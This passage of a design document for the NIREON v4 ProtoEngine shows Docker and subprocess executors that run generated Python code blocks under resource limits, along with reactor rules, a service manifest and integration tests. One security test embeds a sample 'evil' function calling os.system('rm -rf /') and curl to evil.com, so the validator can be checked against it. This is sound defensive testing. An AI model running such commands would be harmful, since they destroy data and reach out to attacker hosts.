            source_node_id=self.instance_id,
            proto_block_id=proto_id,
            dialect=dialect,
            error_type=error_type,
            error_message=error_message,
            execution_context={"component_id": self.instance_id}
        )
        
        if hasattr(context, 'event_bus') and context.event_bus:
            await context.event_bus.publish(signal.signal_type, signal.dict())
    
    async def health_check(self, context: ExecutionContext) -> ComponentHealth:
        """Check component health."""
        
        try:
            # Check if directories are accessible
            work_path = Path(self.config.work_directory)
            artifacts_path = Path(self.config.artifacts_directory)
            
            if not work_path.exists() or not artifacts_path.exists():
                return ComponentHealth(
                    status="unhealthy",
                    message="Required directories not accessible"
                )
            
            # Check executors
            if not self._executors:
                return ComponentHealth(
                    status="unhealthy",
                    message="No executors available"
                )
            
            # Check Docker if using Docker mode
            if self.config.execution_mode == "docker":
                try:
                    docker_client = docker.from_env()
                    docker_client.ping()
                except Exception as e:
                    return ComponentHealth(
                        status="unhealthy",
                        message=f"Docker not available: {e}"
                    )
            
            return ComponentHealth(
                status="healthy",
                message=f"ProtoEngine ready ({self.config.execution_mode} mode)"
            )
            
        except Exception as e:
            return ComponentHealth(
                status="unhealthy",
                message=f"Health check failed: {e}"
            )
    
    async def cleanup(self):
        """Cleanup resources."""
        for executor in self._executors.values():
            if hasattr(executor, 'cleanup'):
                await executor.cleanup()
        await super().cleanup()
```

#### 3.2 Executor Implementations

**Location:** `nireon_v4/proto_engine/executors.py`

```python
from abc import ABC, abstractmethod
import asyncio
import subprocess
import uuid
import json
import time
import shutil
import platform
import docker
from pathlib import Path
from typing import Dict, Any, Optional
from concurrent.futures import ProcessPoolExecutor

from nireon_v4.domain.proto.base_schema import ProtoBlock
from nireon_v4.application.context import ExecutionContext
from .config import ProtoEngineConfig

class ExternalExecutor(ABC):
    """Abstract base class for external executors (Proto and future containerized Mechanisms)."""
    
    @abstractmethod
    async def execute(self, proto: ProtoBlock, context: ExecutionContext) -> Dict[str, Any]:
        """Execute a Proto block and return results."""
        pass

class SubprocessExecutor(ExternalExecutor):
    """Executes Proto blocks in isolated subprocesses.
    
    Note: Current MVP ignores the 'requirements' field in Proto blocks.
    DockerExecutor will eventually validate requirements against an allow-list.
    """
    
    def __init__(self, config: ProtoEngineConfig):
        self.config = config
        self._executor = ProcessPoolExecutor(max_workers=2)
        
        # NOTE: Uses resource.setrlimit → Unix only.  
        # For Windows hosts rely on DockerExecutor.
        if platform.system() == 'Windows':
            import warnings
            warnings.warn(
                "SubprocessExecutor uses resource limits that are Unix-only. "
                "Consider using DockerExecutor for Windows hosts.",
                RuntimeWarning
            )
    
    async def execute(self, proto: ProtoBlock, context: ExecutionContext) -> Dict[str, Any]:
        """Execute Proto in subprocess."""
        
        execution_data = {
            'proto_block': proto.dict(),
            'work_directory': self.config.work_directory,
            'artifacts_directory': self.config.artifacts_directory,
            'timeout_sec': proto.limits.get('timeout_sec', self.config.default_timeout_sec),
            'memory_mb': proto.limits.get('memory_mb', self.config.default_memory_mb),
            'dialect_config': self.config.get_dialect_config(proto.eidos)
        }
        
        try:
            loop = asyncio.get_running_loop()
            result = await loop.run_in_executor(
                self._executor,
                _execute_in_subprocess,
                execution_data
            )
            return result
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "error_type": type(e).__name__
            }
    
    async def cleanup(self):
        """Cleanup executor resources."""
        if self._executor:
            self._executor.shutdown(wait=True)

class DockerExecutor(ExternalExecutor):
    """Executes Proto blocks in Docker containers."""
    
    def __init__(self, config: ProtoEngineConfig):
        self.config = config
        # Use try-except block for environments where Docker might not be installed/running
        try:
            self.docker_client = docker.from_env()
            self.docker_client.ping()  # Verify connection
        except Exception as e:
            raise RuntimeError(f"Docker is not available or configured correctly: {e}")
    
    async def execute(self, proto: ProtoBlock, context: ExecutionContext) -> Dict[str, Any]:
        """Execute Proto in Docker container."""
        
        image_name = f"{self.config.docker_image_prefix}-{proto.eidos}:latest"
        
        # Prepare workspace
        exec_id = str(uuid.uuid4())
        work_dir = Path(self.config.work_directory) / exec_id
        work_dir.mkdir(parents=True, exist_ok=True)
        
        # Write the execution script
        script_content = _generate_execution_script(proto.dict(), work_dir)
        script_path = work_dir / "execute.py"
        script_path.write_text(script_content)
        
        # Write inputs separately for better isolation
        inputs_path = work_dir / "inputs.json"
        inputs_path.write_text(json.dumps(proto.inputs))
        
        # Get resource limits from the Proto block, capped by system config
        memory_limit = min(
            proto.limits.get('memory_mb', self.config.default_memory_mb),
            self.config.default_memory_mb
        )
        timeout = proto.limits.get('timeout_sec', self.config.default_timeout_sec)
        
        try:
            # Run container with strict security settings
            container = self.docker_client.containers.run(
                image=image_name,
                # Pass inputs file as an argument
                command=["python", "-I", "/app/execute.py", "/app/inputs.json"],
                volumes={str(work_dir): {'bind': '/app', 'mode': 'rw'}},
                mem_limit=f"{memory_limit}m",
                nano_cpus=int(0.5 * 1e9),  # 0.5 CPU cores
                network_mode='none',  # Disable networking for security
                detach=True,
                remove=False,  # Don't auto-remove so we can get logs
                environment={
                    'PYTHONPATH': '/app',
                    'PROTO_EXECUTION': 'true'
                }
            )
            
            # Wait for container to finish with timeout
            start_time = time.time()
            exit_status = container.wait(timeout=timeout)
            execution_time = time.time() - start_time
            
            # Retrieve logs
            logs = container.logs().decode('utf-8')
            
            # Parse result
            result_json = _parse_execution_output(logs)
            
            if result_json is None:
                return {
                    "success": False,
                    "error": "No result JSON found in output",
                    "stdout": logs,
                    "exit_code": exit_status['StatusCode']
                }
            
            # Handle artifacts
            if result_json.get("success") and result_json.get("artifacts"):
                result_json["artifacts"] = _move_artifacts(
                    result_json["artifacts"], 
                    work_dir, 
                    self.config.artifacts_directory,
                    exec_id
                )
            
            result_json["execution_time_sec"] = execution_time
            result_json["container_exit_code"] = exit_status['StatusCode']
            
            return result_json
            
        except docker.errors.ContainerError as e:
            return {
                "success": False,
                "error": f"Container error: {e.stderr.decode() if e.stderr else str(e)}",
                "error_type": "ContainerError"
            }
        except docker.errors.ImageNotFound:
            return {
                "success": False,
                "error": f"Docker image not found: {image_name}. Please build the image first.",
                "error_type": "ImageNotFound"
            }
        except docker.errors.APIError as e:
            return {
                "success": False,
                "error": f"Docker API error: {e}",
                "error_type": "DockerAPIError"
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "error_type": type(e).__name__
            }
        finally:
            # Cleanup
            if 'container' in locals():
                try:
                    container.remove(force=True)
                except:
                    pass
            if self.config.cleanup_after_execution and work_dir.exists():
                shutil.rmtree(work_dir, ignore_errors=True)
    
    async def cleanup(self):
        """Cleanup Docker resources."""
        try:
            self.docker_client.close()
        except:
            pass

def _execute_in_subprocess(execution_data: Dict[str, Any]) -> Dict[str, Any]:
    """Execute Proto block in isolated subprocess. Must be top-level for pickling."""
    
    import resource
    import platform
    
    try:
        proto_data = execution_data['proto_block']
        work_dir = Path(execution_data['work_directory'])
        timeout_sec = execution_data['timeout_sec']
        memory_mb = execution_data['memory_mb']
        
        # Create isolated execution directory
        exec_id = str(uuid.uuid4())
        exec_dir = work_dir / exec_id
        exec_dir.mkdir(parents=True, exist_ok=True)
        
        # Write the execution script
        script_content = _generate_execution_script(proto_data, exec_dir)
        
        script_path = exec_dir / "execute.py"
        script_path.write_text(script_content)
        
        # Set resource limits (Unix only)
        def set_limits():
            if platform.system() != 'Windows':
                resource.setrlimit(resource.RLIMIT_AS, (memory_mb * 1024 * 1024, memory_mb * 1024 * 1024))
                resource.setrlimit(resource.RLIMIT_CPU, (timeout_sec, timeout_sec))
        
        # Execute with timeout
        start_time = time.time()
        process = subprocess.run(
            ["python", "-I", str(script_path)],
            capture_output=True,
            text=True,
            timeout=timeout_sec,
            preexec_fn=set_limits if platform.system() != 'Windows' else None,
            cwd=exec_dir
        )
        
        execution_time = time.time() - start_time
        
        # Parse result
        result_json = _parse_execution_output(process.stdout)
        
        if result_json is None:
            return {
                "success": False,
                "error": "No result JSON found in output",
                "stdout": process.stdout,
                "stderr": process.stderr
            }
        
        # Handle artifacts
        if result_json.get("success") and result_json.get("artifacts"):
            result_json["artifacts"] = _move_artifacts(
                result_json["artifacts"], 
                exec_dir, 
                execution_data['artifacts_directory'],
                exec_id
            )
        
        result_json["execution_time_sec"] = execution_time
        result_json["subprocess_returncode"] = process.returncode
        
        return result_json
        
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": f"Execution timed out after {timeout_sec} seconds",
            "error_type": "TimeoutError"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "error_type": type(e).__name__
        }
    finally:
        # Cleanup execution directory
        if 'exec_dir' in locals() and exec_dir.exists():
            shutil.rmtree(exec_dir, ignore_errors=True)

def _generate_execution_script(proto_data: Dict[str, Any], exec_dir: Path) -> str:
    """Generate the Python execution script for a Proto block."""
    
    return f"""
import sys
import os
import json
import time
from pathlib import Path

# Set working directory
os.chdir("{exec_dir}")

# Proto code
{proto_data['code']}

# Execute the function
if __name__ == "__main__":
    try:
        # Read inputs file path from command line argument
        if len(sys.argv) > 1:
            inputs_file_path = sys.argv[1]
            with open(inputs_file_path, 'r') as f:
                inputs = json.load(f)
        else:
            # Fallback for subprocess mode
            inputs = {json.dumps(proto_data['inputs'])}
        
        result = {proto_data['function_name']}(**inputs)
        
        # Look for generated files
        artifacts = []
        for file_path in Path(".").iterdir():
            if file_path.is_file() and file_path.suffix in ['.png', '.pdf', '.svg', '.html', '.csv', '.json']:
                artifacts.append(str(file_path))
        
        # Output results as JSON
        output = {{
            "success": True,
            "result": result,
            "artifacts": artifacts,
            "execution_time": time.time()
        }}
        print("RESULT_JSON:" + json.dumps(output))
        
    except Exception as e:
        error_output = {{
            "success": False,
            "error": str(e),
            "error_type": type(e).__name__
        }}
        print("RESULT_JSON:" + json.dumps(error_output))
"""

def _parse_execution_output(stdout: str) -> Optional[Dict[str, Any]]:
    """Parse execution output to extract result JSON."""
    stdout_lines = stdout.strip().split('\n')
    
    for line in stdout_lines:
        if line.startswith("RESULT_JSON:"):
            try:
                return json.loads(line[12:])
            except json.JSONDecodeError:
                pass
    
    return None

def _move_artifacts(artifacts: List[str], exec_dir: Path, artifacts_dir: str, exec_id: str) -> List[str]:
    """Move artifacts to permanent storage."""
    artifacts_path = Path(artifacts_dir)
    final_artifacts = []
    
    for artifact in artifacts:
        src_path = exec_dir / artifact
        if src_path.exists():
            final_path = artifacts_path / f"{exec_id}_{artifact}"
            shutil.copy2(src_path, final_path)
            final_artifacts.append(str(final_path))
    
    return final_artifacts
```

### Phase 4: Integration & Reactor Rules (Week 4)

#### 4.1 Reactor Rules for Proto Routing

**Location:** `config/reactor_rules/proto_engine_rules.yaml`

```yaml
rules_definitions:
  # Proto routing through gateway
  - id: "proto_task_router"
    description: "Fan-out Proto tasks to ProtoGateway for dialect-based routing"
    conditions:
      - type: "signal_type_match"
        signal_type: "ProtoTaskSignal"
    actions:
      - type: "trigger_component"
        component_id: "proto_gateway_main"
    default_params:
      priority: 5
      timeout_override: null

  # Dialect-specific result handlers
  - id: "math_proto_result_handler"
    description: "Handles math-specific Proto results"
    conditions:
      - type: "signal_type_match"
        signal_type: "MathProtoResultSignal"
      - type: "payload_value"
        field: "execution_time_sec"
        operator: "lt"
        value: 5.0
    actions:
      - type: "trigger_component"
        component_id: "catalyst_main"
        template_id: "AMPLIFY_PROTO_INSIGHTS"

  - id: "proto_error_handler"
    description: "Handles Proto execution errors"
    conditions:
      - type: "signal_type_match"
        signal_type: "ProtoErrorSignal"
    actions:
      - type: "emit_signal"
        signal_type: "SystemAlert"
        payload_static:
          alert_type: "proto_execution_failure"
          severity: "medium"
      - type: "conditional_action"
        condition:
          field: "error_type"
          operator: "eq"
          value: "timeout"
        action:
          type: "emit_signal"
          signal_type: "ResourceAlert"
          payload_static:
            resource_type: "execution_timeout"
      - type: "conditional_action"
        condition:
          field: "error_type"
          operator: "eq"
          value: "budget_exceeded"
        action:
          type: "emit_signal"
          signal_type: "BudgetAlert"
          payload_static:
            alert_type: "proto_budget_exhausted"
```

#### 4.2 Component Registration in Manifest

**Location:** `config/manifests/proto_engine.yaml`

```yaml
version: "1.0"
metadata:
  name: "NIREON with ProtoEngine"
  description: "NIREON configuration with domain-agnostic Proto execution capabilities"

shared_services:
  llm:
    provider: "openai"
    config:
      model: "${LLM_MODEL:-gpt-4o-mini}"
      temperature: 0.7

  event_bus:
    provider: "memory"
    config:
      max_history: 2000
  
  frame_factory:
    class: "nireon_v4.application.services.frame_factory.FrameFactoryService"
    config:
      max_frames: 1000
      default_budget:
        proto_executions: 10
        proto_cpu_seconds: 300
  
  budget_manager:
    class: "nireon_v4.application.services.budget_manager.BudgetManager"
    config:
      enforce_strict: true
      log_violations: true

proto_engines:
  - id: "proto_engine_math"
    class: "nireon_v4.proto_engine.service.ProtoEngine"
    description: "Executes math dialect Proto blocks in sandboxed containers"
    config:
      execution_mode: "${PROTO_EXECUTION_MODE:-docker}"  # Default to Docker
      docker_image_prefix: "${DOCKER_IMAGE_PREFIX:-nireon-proto}"
      work_directory: "${PROTO_WORK_DIR:-runtime/proto/math/workspace}"
      artifacts_directory: "${PROTO_ARTIFACTS_DIR:-runtime/proto/math/artifacts}"
      default_timeout_sec: 15
      default_memory_mb: 512
      
      # Math-specific configuration
      dialect_configs:
        math:
          allowed_packages:
            - "matplotlib"
            - "numpy"
            - "pandas"
            - "scipy"
            - "sympy"
            - "seaborn"
            - "statsmodels"
          enable_latex: true
          plot_dpi: 150

  # Additional dialect engines can be added here
  # - id: "proto_engine_graph"
  #   class: "nireon_v4.proto_engine.service.ProtoEngine"
  #   config:
  #     execution_mode: "${PROTO_EXECUTION_MODE:-docker}"
  #     docker_image_prefix: "${DOCKER_IMAGE_PREFIX:-nireon-proto}"
  #     work_directory: "${PROTO_WORK_DIR:-runtime/proto/graph/workspace}"
  #     artifacts_directory: "${PROTO_ARTIFACTS_DIR:-runtime/proto/graph/artifacts}"
  #     dialect_configs:
  #       graph:
  #         allowed_packages:
  #           - "networkx"
  #           - "matplotlib"
  #           - "numpy"

services:
  - id: "proto_gateway_main"
    class: "nireon_v4.proto_engine.service.ProtoGateway"
    description: "Routes Proto blocks to appropriate engines based on dialect"
    init_args:
      dialect_to_component:
        math: "proto_engine_math"
        # graph: "proto_engine_graph"  # add when ready
        # simulate: "proto_engine_simulate"

  - id: "proto_generator"
    class: "nireon_v4.proto_generator.service.ProtoGenerator"
    description: "Generates Proto blocks from natural language via LLM"
    config:
      supported_dialects:
        - "math"
        - "graph"
        - "simulate"
      default_dialect: "math"

  - id: "explorer_primary"
    class: "nireon_v4.mechanisms.explorer.Explorer"
    description: "Primary exploration mechanism"
    config:
      max_depth: 3
      exploration_strategy: "breadth_first"
      confidence_threshold: 0.6

  - id: "catalyst_main" 
    class: "nireon_v4.mechanisms.catalyst.Catalyst"
    description: "Amplifies insights from Proto executions"
    config:
      amplification_factor: 1.5
      min_trust_score: 0.7

observers:
  - id: "sentinel_guardian"
    class: "Sentinel" 
    config:
      check_interval: 10
      alert_threshold: 0.9
      monitor_proto_executions: true
```

### Phase 5: Testing & Validation (Week 5)

#### 5.1 Integration Test Suite

**Location:** `tests/integration/test_proto_engine.py`

```python
import pytest
import asyncio
import tempfile
from pathlib import Path
from unittest.mock import Mock, AsyncMock

from nireon_v4.bootstrap import bootstrap_nireon_system
from nireon_v4.signals.core import ProtoTaskSignal, ProtoResultSignal, MathProtoResultSignal
from nireon_v4.domain.proto.base_schema import ProtoBlock, ProtoMathBlock

@pytest.fixture
async def nireon_system():
    """Bootstrap a minimal NIREON system for testing."""
    with tempfile.TemporaryDirectory() as temp_dir:
        # Create test manifest
        test_manifest = Path(temp_dir) / "test_manifest.yaml"
        test_manifest.write_text("""
version: "1.0"
shared_services:
  frame_factory:
    class: "nireon_v4.application.services.frame_factory.FrameFactoryService"
    config:
      default_budget:
        proto_executions: 10
        proto_cpu_seconds: 100
  
  budget_manager:
    class: "nireon_v4.application.services.budget_manager.BudgetManager"
    config:
      enforce_strict: true

proto_engines:
  - id: "proto_engine_test"
    class: "nireon_v4.proto_engine.service.ProtoEngine"
    config:
      execution_mode: "subprocess"  # Use subprocess for tests
      work_directory: "{temp_dir}/work"
      artifacts_directory: "{temp_dir}/artifacts"
      dialect_configs:
        math:
          allowed_packages: ["numpy", "matplotlib"]
        graph:
          allowed_packages: ["networkx"]
""".format(temp_dir=temp_dir))
        
        boot_result = await bootstrap_nireon_system(
            config_paths=[test_manifest],
            strict_mode=False
        )
        
        assert boot_result.success
        yield boot_result

@pytest.mark.asyncio
async def test_math_proto_execution_with_budget(nireon_system):
    """Test execution of a math dialect Proto block with budget enforcement."""
    
    proto_block = ProtoMathBlock(
        id="TEST_MATH_PROTO",
        description="Mathematical computation test",
        objective="Test mathematical Proto execution",
        function_name="compute",
        code="""
import numpy as np

def compute(x, n):
    return float(np.sum([x**i for i in range(n)]))
""",
        inputs={"x": 2, "n": 5},
        equation_latex=r"\sum_{i=0}^{n-1} x^i"
    )
    
    # Get proto engine
    registry = nireon_system.registry
    proto_engine = registry.get_service_instance("proto_engine_test")
    assert proto_engine is not None
    
    # Create execution context with frame_id
    from nireon_v4.application.context import NireonExecutionContext
    
    # Create a frame for budget tracking
    frame_factory = registry.get_service_instance("frame_factory")
    frame = await frame_factory.create_frame(
        context=None,
        epistemic_goals=["test_math_computation"],
        resource_budget={
            "proto_executions": 5,
            "proto_cpu_seconds": 50
        }
    )
    
    context = NireonExecutionContext(
        run_id="test_run",
        component_id="test",
        component_registry=registry,
        event_bus=registry.get_service_instance("event_bus"),
        metadata={"frame_id": frame.id}
    )
    
    # Execute
    result = await proto_engine.process(
        {"proto_block": proto_block.dict(), "dialect": "math"},
        context
    )
    
    assert result.success
    assert result.output_data["success"] is True
    assert result.output_data["result"] == 31.0  # 2^0 + 2^1 + 2^2 + 2^3 + 2^4
    
    # Check budget was consumed
    budget_manager = registry.get_service_instance("budget_manager")
    remaining = budget_manager.get_remaining_budget(frame.id)
    assert remaining["proto_executions"] == 4  # Started with 5, used 1
    assert remaining["proto_cpu_seconds"] < 50  # Some CPU seconds consumed

@pytest.mark.asyncio
async def test_budget_exceeded_error(nireon_system):
    """Test that Proto execution fails when budget is exceeded."""
    
    registry = nireon_system.registry
    proto_engine = registry.get_service_instance("proto_engine_test")
    
    # Create a frame with minimal budget
    frame_factory = registry.get_service_instance("frame_factory")
    frame = await frame_factory.create_frame(
        context=None,
        epistemic_goals=["test_budget_limit"],
        resource_budget={
            "proto_executions": 0,  # No executions allowed
            "proto_cpu_seconds": 0
        }
    )
    
    proto_block = ProtoBlock(
        id="TEST_BUDGET_EXCEED",
        eidos="generic",
        description="Test budget enforcement",
        objective="Should fail due to budget",
        function_name="test",
        code="def test(): return 'should not run'",
        inputs={}
    )
    
    from nireon_v4.application.context import NireonExecutionContext
    context = NireonExecutionContext(
        run_id="test_run",
        component_id="test",
        component_registry=registry,
        event_bus=registry.get_service_instance("event_bus"),
        metadata={"frame_id": frame.id}
    )
    
    # Execute - should fail due to budget
    result = await proto_engine.process(
        {"proto_block": proto_block.dict()},
        context
    )
    
    assert not result.success
    assert "Budget exceeded" in result.message

@pytest.mark.asyncio
async def test_dialect_routing(nireon_system):
    """Test that different dialects are handled correctly."""
    
    # Create a generic Proto block (simulating unknown dialect)
    proto_block = ProtoBlock(
        id="TEST_GENERIC_PROTO",
        eidos="custom",
        description="Generic Proto test",
        objective="Test dialect routing",
        function_name="process",
        code="""
def process():
    return {"status": "executed", "dialect": "custom"}
""",
        inputs={}
    )
    
    registry = nireon_system.registry
    proto_engine = registry.get_service_instance("proto_engine_test")
    
    from nireon_v4.application.context import NireonExecutionContext
    context = NireonExecutionContext(
        run_id="test_run",
        component_id="test",
        component_registry=registry,
        event_bus=registry.get_service_instance("event_bus")
    )
    
    # Should execute with basic security validation only
    result = await proto_engine.process(
        {"proto_block": proto_block.dict()},
        context
    )
    
    assert result.success
    assert result.output_data["result"]["dialect"] == "custom"

@pytest.mark.asyncio
async def test_security_validation_across_dialects():
    """Test that security validation works for all dialects."""
    
    from nireon_v4.domain.proto.validation import get_validator_for_dialect
    
    # Test dangerous code is blocked regardless of dialect
    for dialect in ['math', 'graph', 'unknown']:
        dangerous_proto = ProtoBlock(
            id=f"DANGEROUS_{dialect.upper()}",
            eidos=dialect,
            description="Security test",
            objective="Should be blocked",
            function_name="evil",
            code="""
import os
import subprocess

def evil():
    os.system("rm -rf /")
    subprocess.run(["curl", "evil.com"])
    return "bad"
""",
            inputs={}
        )
        
        validator = get_validator_for_dialect(dialect)
        errors = validator.validate(dangerous_proto)
        
        assert len(errors) > 0
        assert any("Blocked import" in error for error in errors)

@pytest.mark.asyncio
async def test_proto_generator_integration(nireon_system):
    """Test Proto generator can create valid Proto blocks."""
    
    registry = nireon_system.registry
    
    # Mock LLM service
    mock_llm = AsyncMock()
    mock_llm.call_llm_async.return_value = Mock(text="""
schema_version: proto/1.0
eidos: math
id: GENERATED_MATH_PROTO
description: "Calculate factorial"
objective: "Compute factorial of a number"
function_name: factorial
code: |
  def factorial(n):
      if n <= 1:
          return 1
      return n * factorial(n - 1)
inputs:
  n: 5
limits:
  timeout_sec: 10
  memory_mb: 256
""")
    
    # Temporarily replace LLM service
    original_llm = registry.get_service_instance("llm_router")
    registry._services["llm_router"] = mock_llm
    
    try:
        # Create proto generator
        from nireon_v4.proto_generator.service import ProtoGenerator
        generator = ProtoGenerator(
            instance_id="test_generator",
            config={"supported_dialects": ["math"], "default_dialect": "math"}
        )
        
        from nireon_v4.application.context import NireonExecutionContext
        context = NireonExecutionContext(
            run_id="test_run",
            component_id="test_generator",
            component_registry=registry,
            event_bus=registry.get_service_instance("event_bus")
        )
        
        # Generate Proto from natural language
        result = await generator.process(
            {"natural_language_request": "Calculate the factorial of 5"},
            context
        )
        
        assert result.success
        assert "GENERATED_MATH_PROTO" in result.message
        
    finally:
        # Restore original LLM service
        if original_llm:
            registry._services["llm_router"] = original_llm

@pytest.mark.asyncio
async def test_concurrent_multi_dialect_execution(nireon_system):
    """Test concurrent execution of different Proto dialects."""
    
    registry = nireon_system.registry
    proto_engine = registry.get_service_instance("proto_engine_test")
    event_bus = registry.get_service_instance("event_bus")
    
    # Create Proto blocks for different dialects
    math_proto = ProtoMathBlock(
        id="CONCURRENT_MATH",
        description="Math computation",
        objective="Concurrent test",
        function_name="calc",
        code="def calc(x): return x * 2",
        inputs={"x": 21}
    )
    
    generic_proto = ProtoBlock(
        id="CONCURRENT_GENERIC",
        eidos="data",
        description="Data processing",
        objective="Concurrent test",
        function_name="process",
        code="def process(data): return len(data)",
        inputs={"data": [1, 2, 3, 4, 5]}
    )
    
    from nireon_v4.application.context import NireonExecutionContext
    context = NireonExecutionContext(
        run_id="test_run",
        component_id="test",
        component_registry=registry,
        event_bus=event_bus
    )
    
    # Execute concurrently
    tasks = [
        proto_engine.process({"proto_block": math_proto.dict()}, context),
        proto_engine.process({"proto_block": generic_proto.dict()}, context)
    ]
    
    results = await asyncio.gather(*tasks)
    
    # Both should succeed
    assert all(r.success for r in results)
    assert results[0].output_data["result"] == 42
    assert results[1].output_data["result"] == 5

@pytest.mark.asyncio
async def test_docker_executor_health_check(nireon_system):
    """Test Docker executor health check."""
    
    # Create a ProtoEngine with Docker mode
    from nireon_v4.proto_engine.service import ProtoEngine
    from nireon_v4.proto_engine.config import ProtoEngineConfig
    
    config = ProtoEngineConfig(
        execution_mode="docker",
        docker_image_prefix="nireon-proto"
    )
    
    engine = ProtoEngine(
        instance_id="docker_test",
        config=config
    )
    
    from nireon_v4.application.context import NireonExecutionContext
    context = NireonExecutionContext(
        run_id="test_run",
        component_id="docker_test",
        component_registry=nireon_system.registry,
        event_bus=nireon_system.registry.get_service_instance("event_bus")
    )
    
    # Initialize the engine
    await engine.initialize(context)
    
    # Check health
    health = await engine.health_check(context)
    
    # If Docker is available, should be healthy; otherwise unhealthy
    assert health.status in ["healthy", "unhealthy"]
    if health.status == "unhealthy":
        assert "Docker" in health.message